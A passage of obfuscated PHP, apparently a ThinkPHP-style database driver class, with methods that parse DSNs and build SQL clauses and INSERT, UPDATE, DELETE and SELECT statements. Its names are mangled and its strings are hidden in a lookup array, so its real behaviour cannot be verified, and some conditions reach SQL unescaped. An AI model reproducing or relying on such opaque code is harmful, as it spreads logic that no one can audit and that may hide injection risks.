$ÉóöÃ; $ÂóÔ•–ì = array($ÂáëĞŞÑ[977] => isset($ÊÍÈ×˜ã[$ÂáëĞŞÑ[977]][$ÉóöÃ]) ? $ÊÍÈ×˜ã[$ÂáëĞŞÑ[977]][$ÉóöÃ] : $ÊÍÈ×˜ã[$ÂáëĞŞÑ[977]][0], $ÂáëĞŞÑ[978] => isset($ÊÍÈ×˜ã[$ÂáëĞŞÑ[978]][$ÉóöÃ]) ? $ÊÍÈ×˜ã[$ÂáëĞŞÑ[978]][$ÉóöÃ] : $ÊÍÈ×˜ã[$ÂáëĞŞÑ[978]][0], $ÂáëĞŞÑ[975] => isset($ÊÍÈ×˜ã[$ÂáëĞŞÑ[975]][$ÉóöÃ]) ? $ÊÍÈ×˜ã[$ÂáëĞŞÑ[975]][$ÉóöÃ] : $ÊÍÈ×˜ã[$ÂáëĞŞÑ[975]][0], $ÂáëĞŞÑ[976] => isset($ÊÍÈ×˜ã[$ÂáëĞŞÑ[976]][$ÉóöÃ]) ? $ÊÍÈ×˜ã[$ÂáëĞŞÑ[976]][$ÉóöÃ] : $ÊÍÈ×˜ã[$ÂáëĞŞÑ[976]][0], $ÂáëĞŞÑ[21] => isset($ÊÍÈ×˜ã[$ÂáëĞŞÑ[21]][$ÉóöÃ]) ? $ÊÍÈ×˜ã[$ÂáëĞŞÑ[21]][$ÉóöÃ] : $ÊÍÈ×˜ã[$ÂáëĞŞÑ[21]][0], $ÂáëĞŞÑ[1005] => isset($ÊÍÈ×˜ã[$ÂáëĞŞÑ[1005]][$ÉóöÃ]) ? $ÊÍÈ×˜ã[$ÂáëĞŞÑ[1005]][$ÉóöÃ] : $ÊÍÈ×˜ã[$ÂáëĞŞÑ[1005]][0], $ÂáëĞŞÑ[17] => isset($ÊÍÈ×˜ã[$ÂáëĞŞÑ[17]][$ÉóöÃ]) ? $ÊÍÈ×˜ã[$ÂáëĞŞÑ[17]][$ÉóöÃ] : $ÊÍÈ×˜ã[$ÂáëĞŞÑ[17]][0]); return $this->connect($ÂóÔ•–ì, $ÉóöÃ); } public function parseDSN($˜óÒäÒÕ) { $Òª¼×¹ =& $_SERVER[Ùæõ‰Ï’]; if (empty($˜óÒäÒÕ)) { return !1; } $‚ê‘Í™˜ = parse_url($˜óÒäÒÕ); if ($‚ê‘Í™˜[$Òª¼×¹[207]]) { $ƒµŸ¡¼Ä = array($Òª¼×¹[1052] => $‚ê‘Í™˜[$Òª¼×¹[207]], $Òª¼×¹[977] => isset($‚ê‘Í™˜[$Òª¼×¹[662]]) ? $‚ê‘Í™˜[$Òª¼×¹[662]] : $Òª¼×¹[12], $Òª¼×¹[978] => isset($‚ê‘Í™˜[$Òª¼×¹[1076]]) ? $‚ê‘Í™˜[$Òª¼×¹[1076]] : $Òª¼×¹[12], $Òª¼×¹[975] => isset($‚ê‘Í™˜[$Òª¼×¹[208]]) ? $‚ê‘Í™˜[$Òª¼×¹[208]] : $Òª¼×¹[12], $Òª¼×¹[976] => isset($‚ê‘Í™˜[$Òª¼×¹[209]]) ? $‚ê‘Í™˜[$Òª¼×¹[209]] : $Òª¼×¹[12], $Òª¼×¹[21] => isset($‚ê‘Í™˜[$Òª¼×¹[87]]) ? substr($‚ê‘Í™˜[$Òª¼×¹[87]], 1) : $Òª¼×¹[12]); } else { preg_match($Òª¼×¹[1077], trim($˜óÒäÒÕ), $Ôüò‰ù); $ƒµŸ¡¼Ä = array($Òª¼×¹[1052] => $Ôüò‰ù[1], $Òª¼×¹[977] => $Ôüò‰ù[2], $Òª¼×¹[978] => $Ôüò‰ù[3], $Òª¼×¹[975] => $Ôüò‰ù[4], $Òª¼×¹[976] => $Ôüò‰ù[5], $Òª¼×¹[21] => $Ôüò‰ù[6]); } $ƒµŸ¡¼Ä[$Òª¼×¹[1005]] = $Òª¼×¹[12]; return $ƒµŸ¡¼Ä; } protected function debug() { $Ì“ñ¿õó =& $_SERVER[Ùæõ‰Ï’]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ì“ñ¿õó[1078]; if (think_config($Ì“ñ¿õó[1079])) { think_status($Ì“ñ¿õó[1080]); think_trace($this->queryStr . $Ì“ñ¿õó[1081] . think_status($Ì“ñ¿õó[24], $Ì“ñ¿õó[1080], 6) . $Ì“ñ¿õó[1082], $Ì“ñ¿õó[12], $Ì“ñ¿õó[1083]); } } protected function parseLock($úëô¹ş = false) { $÷ôŠ­® =& $_SERVER[Ùæõ‰Ï’]; if (!$úëô¹ş) { return $÷ôŠ­®[12]; } if ($÷ôŠ­®[1007] == $this->dbType) { return $÷ôŠ­®[1084]; } return $÷ôŠ­®[1085]; } protected function parseSet($ôò°¸šƒ) { $‡†£´Õ =& $_SERVER[Ùæõ‰Ï’]; foreach ($ôò°¸šƒ as $Ä›İ¶êÅ => $éßíçñ) { if (is_array($éßíçñ) && $‡†£´Õ[373] == $éßíçñ[0]) { $ñ¦íà£í[] = $this->parseKey($Ä›İ¶êÅ) . $‡†£´Õ[973] . $éßíçñ[1]; } elseif (is_scalar($éßíçñ) || is_null($éßíçñ)) { $ñ¦íà£í[] = $this->parseKey($Ä›İ¶êÅ) . $‡†£´Õ[973] . $this->parseValue($éßíçñ); } } return $‡†£´Õ[1086] . implode($‡†£´Õ[50], $ñ¦íà£í); } protected function bindParam($¼ó‡çÙø, $çı£Ãö) { $this->bind[$_SERVER[Ùæõ‰Ï’][4] . $¼ó‡çÙø] = $çı£Ãö; } protected function parseBind($ÑÁ È¬–) { $ÑÁ È¬– = array_merge($this->bind, $ÑÁ È¬–); $this->bind = array(); return $ÑÁ È¬–; } function parseKey(&$ÃìËÂîË, $ˆÈóä¾ç = true) { if ($ˆÈóä¾ç) { $ÃìËÂîË = $this->parseKeyCheck($ÃìËÂîË); } return $ÃìËÂîË; } function parseKeyCheck($İğï™¸) { $úƒØğáÖ =& $_SERVER[Ùæõ‰Ï’]; $İğï™¸ = trim($İğï™¸); if (!preg_match($úƒØğáÖ[1087], $İğï™¸)) { think_exception($úƒØğáÖ[1088] . $İğï™¸); } return $İğï™¸; } protected function parseValue($Çß¡ÁÖÊ) { $ûÆ×Ş¼¦ =& $_SERVER[Ùæõ‰Ï’]; if (is_string($Çß¡ÁÖÊ)) { $Çß¡ÁÖÊ = $ûÆ×Ş¼¦[1046] . $this->escapeString($Çß¡ÁÖÊ) . $ûÆ×Ş¼¦[1046]; } elseif (isset($Çß¡ÁÖÊ[0]) && is_string($Çß¡ÁÖÊ[0]) && strtolower($Çß¡ÁÖÊ[0]) == $ûÆ×Ş¼¦[373]) { $Çß¡ÁÖÊ = $this->escapeString($Çß¡ÁÖÊ[1]); } elseif (is_array($Çß¡ÁÖÊ)) { $Çß¡ÁÖÊ = array_map(array($this, $ûÆ×Ş¼¦[1047]), $Çß¡ÁÖÊ); } elseif (is_bool($Çß¡ÁÖÊ)) { $Çß¡ÁÖÊ = $Çß¡ÁÖÊ ? $ûÆ×Ş¼¦[91] : $ûÆ×Ş¼¦[228]; } elseif (is_null($Çß¡ÁÖÊ)) { $Çß¡ÁÖÊ = $ûÆ×Ş¼¦[106]; } return $Çß¡ÁÖÊ; } protected function parseField($Ò¸©íˆ–) { $º£“ÃÒ =& $_SERVER[Ùæõ‰Ï’]; if (is_string($Ò¸©íˆ–) && strpos($Ò¸©íˆ–, $º£“ÃÒ[50])) { $Ò¸©íˆ– = explode($º£“ÃÒ[50], $Ò¸©íˆ–); } if (is_array($Ò¸©íˆ–)) { $‡«½éâ = array(); foreach ($Ò¸©íˆ– as $º†©Ù¦Õ => $Âô–åˆ) { if (!is_numeric($º†©Ù¦Õ)) { $‡«½éâ[] = $this->parseKey($º†©Ù¦Õ, !1) . $º£“ÃÒ[1089] . $this->parseKey($Âô–åˆ); } else { $‡«½éâ[] = $this->parseKey($Âô–åˆ); } } $­É§ôÆ = implode($º£“ÃÒ[50], $‡«½éâ); } elseif (is_string($Ò¸©íˆ–) && !empty($Ò¸©íˆ–)) { $­É§ôÆ = $Ò¸©íˆ–; } else { $­É§ôÆ = $º£“ÃÒ[220]; } return $­É§ôÆ; } protected function parseTable($ïò²úÉ¿) { $•éÄ» =& $_SERVER[Ùæõ‰Ï’]; if (is_array($ïò²úÉ¿)) { $Ø Ò±ûŠ = array(); foreach ($ïò²úÉ¿ as $Äò¼¾õæ => $¬ ß•é½) { if (!is_numeric($Äò¼¾õæ)) { $Ø Ò±ûŠ[] = $this->parseKey($Äò¼¾õæ) . $•éÄ»[53] . $this->parseKey($¬ ß•é½); } else { $Ø Ò±ûŠ[] = $this->parseKey($Äò¼¾õæ); } } $ïò²úÉ¿ = $Ø Ò±ûŠ; } elseif (is_string($ïò²úÉ¿)) { if (strstr($ïò²úÉ¿, $•éÄ»[53])) { return $ïò²úÉ¿; } $ïò²úÉ¿ = explode($•éÄ»[50], $ïò²úÉ¿); array_walk($ïò²úÉ¿, array($this, $•éÄ»[995])); } return $•éÄ»[989] . trim(implode($•éÄ»[1090], $ïò²úÉ¿), $•éÄ»[461]) . $•éÄ»[989]; } protected function parseWhere($ßÔŞó¯Á) { $ùÈÒº¹ =& $_SERVER[Ùæõ‰Ï’]; $¡¸š¸øÕ = $ùÈÒº¹[12]; if (is_string($ßÔŞó¯Á)) { $¡¸š¸øÕ = $ßÔŞó¯Á; } else { $ÔñÙ€Ã‚ = isset($ßÔŞó¯Á[$ùÈÒº¹[1091]]) ? strtoupper($ßÔŞó¯Á[$ùÈÒº¹[1091]]) : $ùÈÒº¹[12]; if (in_array($ÔñÙ€Ã‚, array($ùÈÒº¹[1092], $ùÈÒº¹[1093], $ùÈÒº¹[1094]))) { $ÔñÙ€Ã‚ = $ùÈÒº¹[53] . $ÔñÙ€Ã‚ . $ùÈÒº¹[53]; unset($ßÔŞó¯Á[$ùÈÒº¹[1091]]); } else { $ÔñÙ€Ã‚ = $ùÈÒº¹[1095]; } foreach ($ßÔŞó¯Á as $ƒ¿·‚°Å => $ÂÔ¨ˆæô) { $¡¸š¸øÕ .= $ùÈÒº¹[354]; if (is_numeric($ƒ¿·‚°Å)) { $ƒ¿·‚°Å = $ùÈÒº¹[1096]; } if (0 === strpos($ƒ¿·‚°Å, $ùÈÒº¹[11])) { $¡¸š¸øÕ .= $this->parseThinkWhere($ƒ¿·‚°Å, $ÂÔ¨ˆæô); } else { if (!preg_match($ùÈÒº¹[1097], trim($ƒ¿·‚°Å))) { think_exception(think_lang($ùÈÒº¹[1098]) . $ùÈÒº¹[4] . $ƒ¿·‚°Å); } $×ÅåÏÅ¿ = is_array($ÂÔ¨ˆæô) && isset($ÂÔ¨ˆæô[$ùÈÒº¹[1099]]); $ƒ¿·‚°Å = trim($ƒ¿·‚°Å); if (strpos($ƒ¿·‚°Å, $ùÈÒº¹[214])) { $ª—² ³ = explode($ùÈÒº¹[214], $ƒ¿·‚°Å); $îÁã™ = array(); foreach ($ª—² ³ as $ö‘±Şå” => $Èæ÷„“) { $‚¹ÅÆÆ— = $×ÅåÏÅ¿ ? $ÂÔ¨ˆæô[$ö‘±Şå”] : $ÂÔ¨ˆæô; $îÁã™[] = $ùÈÒº¹[337] . $this->parseWhereItem($this->parseKey($Èæ÷„“), $‚¹ÅÆÆ—) . $ùÈÒº¹[994]; } $¡¸š¸øÕ .= implode($ùÈÒº¹[1100], $îÁã™); } elseif (strpos($ƒ¿·‚°Å, $ùÈÒº¹[360])) { $ª—² ³ = explode($ùÈÒº¹[360], $ƒ¿·‚°Å); $îÁã™ = array(); foreach ($ª—² ³ as $ö‘±Şå” => $Èæ÷„“) { $‚¹ÅÆÆ— = $×ÅåÏÅ¿ ? $ÂÔ¨ˆæô[$ö‘±Şå”] : $ÂÔ¨ˆæô; $îÁã™[] = $ùÈÒº¹[337] . $this->parseWhereItem($this->parseKey($Èæ÷„“), $‚¹ÅÆÆ—) . $ùÈÒº¹[994]; } $¡¸š¸øÕ .= implode($ùÈÒº¹[1095], $îÁã™); } else { $¡¸š¸øÕ .= $this->parseWhereItem($this->parseKey($ƒ¿·‚°Å), $ÂÔ¨ˆæô); } } $¡¸š¸øÕ .= $ùÈÒº¹[355] . $ÔñÙ€Ã‚; } $¡¸š¸øÕ = substr($¡¸š¸øÕ, 0, -strlen($ÔñÙ€Ã‚)); } return empty($¡¸š¸øÕ) ? $ùÈÒº¹[12] : $ùÈÒº¹[1101] . $¡¸š¸øÕ; } protected function parseWhereItem($’Ÿ–±ÖŠ, $…é¦¥ä) { $´ƒÏ€°İ =& $_SERVER[Ùæõ‰Ï’]; $Ø¤Ìôù = $´ƒÏ€°İ[12]; if (is_array($…é¦¥ä)) { if (is_string($…é¦¥ä[0])) { $º·Çéƒ = strtolower($…é¦¥ä[0]); if (in_array($…é¦¥ä[0], array($´ƒÏ€°İ[973], $´ƒÏ€°İ[1102], $´ƒÏ€°İ[1103], $´ƒÏ€°İ[1104], $´ƒÏ€°İ[1105], $´ƒÏ€°İ[1106]))) { $Ø¤Ìôù .= $’Ÿ–±ÖŠ . $´ƒÏ€°İ[53] . $…é¦¥ä[0] . $´ƒÏ€°İ[53] . $this->parseValue($…é¦¥ä[1]); } elseif (preg_match($´ƒÏ€°İ[1107], $…é¦¥ä[0])) { $Ø¤Ìôù .= $’Ÿ–±ÖŠ . $´ƒÏ€°İ[53] . $this->exp[$º·Çéƒ] . $´ƒÏ€°İ[53] . $this->parseValue($…é¦¥ä[1]); } elseif (preg_match($´ƒÏ€°İ[1108], $…é¦¥ä[0])) { if (is_array($…é¦¥ä[1])) { $ÒÆöÎÏü = isset($…é¦¥ä[2]) ? strtoupper($…é¦¥ä[2]) : $´ƒÏ€°İ[1093]; if (in_array($ÒÆöÎÏü, array($´ƒÏ€°İ[1092], $´ƒÏ€°İ[1093], $´ƒÏ€°İ[1094]))) { $·ÜÁ™âæ = array(); foreach ($…é¦¥ä[1] as $¦¬¸˜¡ñ) { $·ÜÁ™âæ[] = $’Ÿ–±ÖŠ . $´ƒÏ€°İ[53] . $this->exp[$º·Çéƒ] . $´ƒÏ€°İ[53] . $this->parseValue($¦¬¸˜¡ñ); } $Ø¤Ìôù .= $´ƒÏ€°İ[337] . implode($´ƒÏ€°İ[53] . $ÒÆöÎÏü . $´ƒÏ€°İ[53], $·ÜÁ™âæ) . $´ƒÏ€°İ[994]; } } else { $Ø¤Ìôù .= $’Ÿ–±ÖŠ . $´ƒÏ€°İ[53] . $this->exp[$º·Çéƒ] . $´ƒÏ€°İ[53] . $this->parseValue($…é¦¥ä[1]); } } elseif ($´ƒÏ€°İ[373] == $º·Çéƒ) { $Ø¤Ìôù .= $´ƒÏ€°İ[992] . $’Ÿ–±ÖŠ . $´ƒÏ€°İ[53] . $…é¦¥ä[1] . $´ƒÏ€°İ[1109]; } elseif (preg_match($´ƒÏ€°İ[1110], $…é¦¥ä[0])) { $Ø¤Ìôù .= $…é¦¥ä[0]; } elseif (preg_match($´ƒÏ€°İ[1111], $…é¦¥ä[0])) { if (isset($…é¦¥ä[2]) && $´ƒÏ€°İ[373] == $…é¦¥ä[2]) { $Ø¤Ìôù .= $’Ÿ–±ÖŠ . $´ƒÏ€°İ[53] . $this->exp[$º·Çéƒ] . $´ƒÏ€°İ[53] . $…é¦¥ä[1]; } else { if (is_string($…é¦¥ä[1])) { $…é¦¥ä[1] = explode($´ƒÏ€°İ[50], $…é¦¥ä[1]); } $¯Çàµ£† = implode($´ƒÏ€°İ[50], $this->parseValue($…é¦¥ä[1])); $Ø¤Ìôù .= $’Ÿ–±ÖŠ . $´ƒÏ€°İ[53] . $this->exp[$º·Çéƒ] . $´ƒÏ€°İ[992] . $¯Çàµ£† . $´ƒÏ€°İ[994]; } } elseif (preg_match($´ƒÏ€°İ[1112], $…é¦¥ä[0])) { $ì©÷¯„ = is_string($…é¦¥ä[1]) ? explode($´ƒÏ€°İ[50], $…é¦¥ä[1]) : $…é¦¥ä[1]; $Ø¤Ìôù .= $´ƒÏ€°İ[992] . $’Ÿ–±ÖŠ . $´ƒÏ€°İ[53] . $this->exp[$º·Çéƒ] . $´ƒÏ€°İ[53] . $this->parseValue($ì©÷¯„[0]) . $´ƒÏ€°İ[1095] . $this->parseValue($ì©÷¯„[1]) . $´ƒÏ€°İ[355]; } else { think_exception(think_lang($´ƒÏ€°İ[1098]) . $´ƒÏ€°İ[4] . $…é¦¥ä[0]); } } else { $ÈÜâ®™  = count($…é¦¥ä); $ò©ÃÒ£ë = $´ƒÏ€°İ[12]; if (is_string($…é¦¥ä[$ÈÜâ®™  - 1])) { $ò©ÃÒ£ë = isset($…é¦¥ä[$ÈÜâ®™  - 1]) ? strtoupper($…é¦¥ä[$ÈÜâ®™  - 1]) : $´ƒÏ€°İ[12]; if (in_array($ò©ÃÒ£ë, array($´ƒÏ€°İ[1092], $´ƒÏ€°İ[1093], $´ƒÏ€°İ[1094]))) { $ÈÜâ®™  = $ÈÜâ®™  - 1; } } else { $ò©ÃÒ£ë = $´ƒÏ€°İ[1092]; } for ($¡ ½Ã´å = 0; $¡ ½Ã´å < $ÈÜâ®™ ; $¡ ½Ã´å++) { $ì©÷¯„ = is_array($…é¦¥ä[$¡ ½Ã´å]) ? $…é¦¥ä[$¡ ½Ã´å][1] : $…é¦¥ä[$¡ ½Ã´å]; if ($´ƒÏ€°İ[373] == strtolower($…é¦¥ä[$¡ ½Ã´å][0])) { $Ø¤Ìôù .= $´ƒÏ€°İ[337] . $’Ÿ–±ÖŠ . $´ƒÏ€°İ[53] . $ì©÷¯„ . $´ƒÏ€°İ[1109] . $ò©ÃÒ£ë . $´ƒÏ€°İ[53]; } else { $Ğ¢ ÖŠ• = is_array($…é¦¥ä[$¡ ½Ã´å]) ? $this->exp[strtolower($…é¦¥ä[$¡ ½Ã´å][0])] : $´ƒÏ€°İ[973]; if (!$Ğ¢ ÖŠ• && is_array($…é¦¥ä[$¡ ½Ã´å]) && in_array($…é¦¥ä[$¡ ½Ã´å][0], array($´ƒÏ€°İ[973], $´ƒÏ€°İ[1102], $´ƒÏ€°İ[1103], $´ƒÏ€°İ[1104], $´ƒÏ€°İ[1105], $´ƒÏ€°İ[1106]))) { $Ğ¢ ÖŠ• = $…é¦¥ä[$¡ ½Ã´å][0]; } $Ø¤Ìôù .= $´ƒÏ€°İ[337] . $’Ÿ–±ÖŠ . $´ƒÏ€°İ[53] . $Ğ¢ ÖŠ• . $´ƒÏ€°İ[53] . $this->parseValue($ì©÷¯„) . $´ƒÏ€°İ[1109] . $ò©ÃÒ£ë . $´ƒÏ€°İ[53]; } } $Ø¤Ìôù = substr($Ø¤Ìôù, 0, -4); } } else { $Ø¤Ìôù .= $’Ÿ–±ÖŠ . $´ƒÏ€°İ[1113] . $this->parseValue($…é¦¥ä); } return $Ø¤Ìôù; } protected function parseThinkWhere($‰îºÊìÆ, $¿òÎŞÛ) { $¿š‰ì´ˆ =& $_SERVER[Ùæõ‰Ï’]; $Ú¾œ¾‰ = $¿š‰ì´ˆ[12]; switch ($‰îºÊìÆ) { case $¿š‰ì´ˆ[428]: $Ú¾œ¾‰ = $¿òÎŞÛ; break; case $¿š‰ì´ˆ[1096]: $Ú¾œ¾‰ = is_string($¿òÎŞÛ) ? $¿òÎŞÛ : substr($this->parseWhere($¿òÎŞÛ), 6); break; case $¿š‰ì´ˆ[1114]: parse_str($¿òÎŞÛ, $¬šëÊ©Ê); if (isset($¬šëÊ©Ê[$¿š‰ì´ˆ[1091]])) { $Æ×Û‚œ = $¿š‰ì´ˆ[53] . strtoupper($¬šëÊ©Ê[$¿š‰ì´ˆ[1091]]) . $¿š‰ì´ˆ[53]; unset($¬šëÊ©Ê[$¿š‰ì´ˆ[1091]]); } else { $Æ×Û‚œ = $¿š‰ì´ˆ[1095]; } $ˆÆš¬™· = array(); foreach ($¬šëÊ©Ê as $ÈíÔœª§ => $ëôèä³) { $ˆÆš¬™·[] = $this->parseKey($ÈíÔœª§) . $¿š‰ì´ˆ[1113] . $this->parseValue($ëôèä³); } $Ú¾œ¾‰ = implode($Æ×Û‚œ, $ˆÆš¬™·); break; } return $Ú¾œ¾‰; } protected function parseLimit($ñœİ¹Ğß) { $ñéïšÈø =& $_SERVER[Ùæõ‰Ï’]; return !empty($ñœİ¹Ğß) ? $ñéïšÈø[51] . $ñœİ¹Ğß . $ñéïšÈø[53] : $ñéïšÈø[12]; } protected function parseJoin($åî¡¶Õ¼) { $³Ù¨¿˜‚ =& $_SERVER[Ùæõ‰Ï’]; $—¢™Ìü = $³Ù¨¿˜‚[12]; if (!empty($åî¡¶Õ¼)) { if (is_array($åî¡¶Õ¼)) { foreach ($åî¡¶Õ¼ as $ºÙââ¼¬ => $İ³ƒÂ¶ö) { if (!1 !== stripos($İ³ƒÂ¶ö, $³Ù¨¿˜‚[1115])) { $—¢™Ìü .= $³Ù¨¿˜‚[53] . $İ³ƒÂ¶ö; } else { $—¢™Ìü .= $³Ù¨¿˜‚[1116] . $İ³ƒÂ¶ö; } } } else { $—¢™Ìü .= $³Ù¨¿˜‚[1116] . $åî¡¶Õ¼; } } $—¢™Ìü = preg_replace($³Ù¨¿˜‚[1117], think_config($³Ù¨¿˜‚[1019]) . $³Ù¨¿˜‚[1118], $—¢™Ìü); return $—¢™Ìü; } protected function parseOrder($Â«ó’…ò) { $±×¦á‹­ =& $_SERVER[Ùæõ‰Ï’]; if (is_array($Â«ó’…ò)) { $øİŠ¬Çß = array(); foreach ($Â«ó’…ò as $‡èà‡íÓ => $¶·¿¦‰ú) { if (is_numeric($‡èà‡íÓ)) { $øİŠ¬Çß[] = $this->parseKey($¶·¿¦‰ú); } else { $¶·¿¦‰ú = in_array(strtoupper(trim($¶·¿¦‰ú)), array($±×¦á‹­[1119], $±×¦á‹­[1120])) ? $±×¦á‹­[53] . $¶·¿¦‰ú : $±×¦á‹­[12]; if (preg_match($±×¦á‹­[1121], $‡èà‡íÓ)) { $øİŠ¬Çß[] = $this->parseKey($‡èà‡íÓ) . $¶·¿¦‰ú; } else { think_exception($±×¦á‹­[1122] . $‡èà‡íÓ); } } } $Â«ó’…ò = implode($±×¦á‹­[50], $øİŠ¬Çß); } return !empty($Â«ó’…ò) ? $±×¦á‹­[1123] . $Â«ó’…ò : $±×¦á‹­[12]; } protected function parseGroup($ìĞÕÉ«¨) { $¨ªÌ‚·µ =& $_SERVER[Ùæõ‰Ï’]; return !empty($ìĞÕÉ«¨) ? $¨ªÌ‚·µ[1124] . $ìĞÕÉ«¨ : $¨ªÌ‚·µ[12]; } protected function parseHaving($Ø³’¹ˆş) { $£û×”êƒ =& $_SERVER[Ùæõ‰Ï’]; return !empty($Ø³’¹ˆş) ? $£û×”êƒ[1125] . $Ø³’¹ˆş : $£û×”êƒ[12]; } protected function parseComment($şÌàÈÈâ) { $ìËØ³ãë =& $_SERVER[Ùæõ‰Ï’]; return !empty($şÌàÈÈâ) ? $ìËØ³ãë[1126] . $şÌàÈÈâ . $ìËØ³ãë[1127] : $ìËØ³ãë[12]; } protected function parseDistinct($Á÷¯¹) { $£¨ôÕ»Ë =& $_SERVER[Ùæõ‰Ï’]; return !empty($Á÷¯¹) ? $£¨ôÕ»Ë[1128] : $£¨ôÕ»Ë[12]; } protected function parseUnion($¶•õ„Ó) { $Ô‘ƒ‰¨¬ =& $_SERVER[Ùæõ‰Ï’]; if (empty($¶•õ„Ó)) { return $Ô‘ƒ‰¨¬[12]; } if (isset($¶•õ„Ó[$Ô‘ƒ‰¨¬[424]])) { $¤Î’Ç…Á = $Ô‘ƒ‰¨¬[1129]; unset($¶•õ„Ó[$Ô‘ƒ‰¨¬[424]]); } else { $¤Î’Ç…Á = $Ô‘ƒ‰¨¬[1130]; } foreach ($¶•õ„Ó as $°Å¡‰¨ò) { $È¦Œ‡À[] = $¤Î’Ç…Á . (is_array($°Å¡‰¨ò) ? $this->buildSelectSql($°Å¡‰¨ò) : $°Å¡‰¨ò); } return implode($Ô‘ƒ‰¨¬[53], $È¦Œ‡À); } public function insert($ÈŒİİ‹, $¡­¦óÏ = array(), $å¾ •¬ó = false) { $§ÂÑû—Æ =& $_SERVER[Ùæõ‰Ï’]; $ğ“ÜĞ¦ = $û€¯ò¾ = array(); $this->model = $¡­¦óÏ[$§ÂÑû—Æ[358]]; foreach ($ÈŒİİ‹ as $‚¿á¸è => $‹ôæş“ˆ) { if (is_array($‹ôæş“ˆ) && $§ÂÑû—Æ[373] == $‹ôæş“ˆ[0]) { $û€¯ò¾[] = $this->parseKey($‚¿á¸è); $ğ“ÜĞ¦[] = $‹ôæş“ˆ[1]; } elseif (is_scalar($‹ôæş“ˆ) || is_null($‹ôæş“ˆ)) { $û€¯ò¾[] = $this->parseKey($‚¿á¸è); $ğ“ÜĞ¦[] = $this->parseValue($‹ôæş“ˆ); } } $Ê´Ş¡¤ = ($å¾ •¬ó ? $§ÂÑû—Æ[996] : $§ÂÑû—Æ[997]) . $§ÂÑû—Æ[998] . $this->parseTable($¡­¦óÏ[$§ÂÑû—Æ[356]]) . $§ÂÑû—Æ[992] . implode($§ÂÑû—Æ[50], $û€¯ò¾) . $§ÂÑû—Æ[993] . implode($§ÂÑû—Æ[50], $ğ“ÜĞ¦) . $§ÂÑû—Æ[994]; $Ê´Ş¡¤ .= $this->parseLock(isset($¡­¦óÏ[$§ÂÑû—Æ[926]]) ? $¡­¦óÏ[$§ÂÑû—Æ[926]] : !1); $Ê´Ş¡¤ .= $this->parseComment(!empty($¡­¦óÏ[$§ÂÑû—Æ[430]]) ? $¡­¦óÏ[$§ÂÑû—Æ[430]] : $§ÂÑû—Æ[12]); return $this->execute($Ê´Ş¡¤, $this->parseBind(!empty($¡­¦óÏ[$§ÂÑû—Æ[361]]) ? $¡­¦óÏ[$§ÂÑû—Æ[361]] : array())); } public function selectInsert($İ•ñŒŸÁ, $¢×¾¼«Ş, $»İèœìÏ = array()) { $¹…Ü’ëª =& $_SERVER[Ùæõ‰Ï’]; $this->model = $»İèœìÏ[$¹…Ü’ëª[358]]; if (is_string($İ•ñŒŸÁ)) { $İ•ñŒŸÁ = explode($¹…Ü’ëª[50], $İ•ñŒŸÁ); } array_walk($İ•ñŒŸÁ, array($this, $¹…Ü’ëª[995])); $ïÂÔ¾ä = $¹…Ü’ëª[1131] . $this->parseTable($¢×¾¼«Ş) . $¹…Ü’ëª[992] . implode($¹…Ü’ëª[50], $İ•ñŒŸÁ) . $¹…Ü’ëª[1109]; $ïÂÔ¾ä .= $this->buildSelectSql($»İèœìÏ); return $this->execute($ïÂÔ¾ä, $this->parseBind(!empty($»İèœìÏ[$¹…Ü’ëª[361]]) ? $»İèœìÏ[$¹…Ü’ëª[361]] : array())); } public function update($²×ã, $ˆ£ãÃ—°) { $²”à‚™ =& $_SERVER[Ùæõ‰Ï’]; $this->model = $ˆ£ãÃ—°[$²”à‚™[358]]; $ì·Äè×‡ = $²”à‚™[1132] . $this->parseTable($ˆ£ãÃ—°[$²”à‚™[356]]) . $this->parseSet($²×ã) . $this->parseWhere(!empty($ˆ£ãÃ—°[$²”à‚™[352]]) ? $ˆ£ãÃ—°[$²”à‚™[352]] : $²”à‚™[12]) . $this->parseOrder(!empty($ˆ£ãÃ—°[$²”à‚™[441]]) ? $ˆ£ãÃ—°[$²”à‚™[441]] : $²”à‚™[12]) . $this->parseLimit(!empty($ˆ£ãÃ—°[$²”à‚™[368]]) ? $ˆ£ãÃ—°[$²”à‚™[368]] : $²”à‚™[12]) . $this->parseLock(isset($ˆ£ãÃ—°[$²”à‚™[926]]) ? $ˆ£ãÃ—°[$²”à‚™[926]] : !1) . $this->parseComment(!empty($ˆ£ãÃ—°[$²”à‚™[430]]) ? $ˆ£ãÃ—°[$²”à‚™[430]] : $²”à‚™[12]); return $this->execute($ì·Äè×‡, $this->parseBind(!empty($ˆ£ãÃ—°[$²”à‚™[361]]) ? $ˆ£ãÃ—°[$²”à‚™[361]] : array())); } public function delete($¤Ç¡†…ï = array()) { $ù–û¯Ø– =& $_SERVER[Ùæõ‰Ï’]; $this->model = $¤Ç¡†…ï[$ù–û¯Ø–[358]]; $Ì‹­‘– = $ù–û¯Ø–[1133] . $this->parseTable($¤Ç¡†…ï[$ù–û¯Ø–[356]]) . $this->parseWhere(!empty($¤Ç¡†…ï[$ù–û¯Ø–[352]]) ? $¤Ç¡†…ï[$ù–û¯Ø–[352]] : $ù–û¯Ø–[12]) . $this->parseOrder(!empty($¤Ç¡†…ï[$ù–û¯Ø–[441]]) ? $¤Ç¡†…ï[$ù–û¯Ø–[441]] : $ù–û¯Ø–[12]) . $this->parseLimit(!empty($¤Ç¡†…ï[$ù–û¯Ø–[368]]) ? $¤Ç¡†…ï[$ù–û¯Ø–[368]] : $ù–û¯Ø–[12]) . $this->parseLock(isset($¤Ç¡†…ï[$ù–û¯Ø–[926]]) ? $¤Ç¡†…ï[$ù–û¯Ø–[926]] : !1) . $this->parseComment(!empty($¤Ç¡†…ï[$ù–û¯Ø–[430]]) ? $¤Ç¡†…ï[$ù–û¯Ø–[430]] : $ù–û¯Ø–[12]); return $this->execute($Ì‹­‘–, $this->parseBind(!empty($¤Ç¡†…ï[$ù–û¯Ø–[361]]) ? $¤Ç¡†…ï[$ù–û¯Ø–[361]] : array())); } public function select($Í¼ïÙïÎ = array()) { $ù’ŠÚß =& $_SERVER[Ùæõ‰Ï’]; $this->model = $Í¼ïÙïÎ[$ù’ŠÚß[358]]; $åÃô»Ø· = $this->buildSelectSql($Í¼ïÙïÎ); $¿À†ò‚ = isset($Í¼ïÙïÎ[$ù’ŠÚß[425]]) ? $Í¼ïÙïÎ[$ù’ŠÚß[425]] : !1; if ($¿À†ò‚) { $ÜÚÜî²è = is_string($¿À†ò‚[$ù’ŠÚß[97]]) ? $¿À†ò‚[$ù’ŠÚß[97]] : $ù’ŠÚß[1134] . md5($åÃô»Ø·); 